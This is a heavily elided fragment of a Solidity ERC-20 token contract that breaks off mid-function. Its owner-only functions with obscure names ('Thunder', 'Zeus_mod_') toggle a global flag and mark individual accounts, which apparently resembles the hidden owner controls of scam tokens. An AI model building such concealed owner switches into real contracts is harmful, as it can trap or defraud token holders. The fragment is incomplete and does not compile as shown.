...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function changeOwner(address _owner) onlyOwner public {
      ...
      function Thunder(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
     function Zeus_mod_(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function distrib(address account) onlyOwner public {
